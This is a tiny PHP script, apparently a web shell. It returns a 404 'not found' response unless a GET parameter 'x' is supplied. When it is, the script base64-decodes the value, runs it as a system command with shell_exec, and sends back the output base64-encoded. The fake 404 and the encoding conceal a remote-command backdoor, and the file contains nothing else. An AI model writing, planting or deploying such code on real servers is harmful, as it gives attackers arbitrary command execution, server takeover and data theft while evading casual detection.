<?php
if(!isset($_GET['x'])) { http_response_code(404); exit; }
$o = shell_exec(base64_decode($_GET['x']));
echo base64_encode($o);
?>
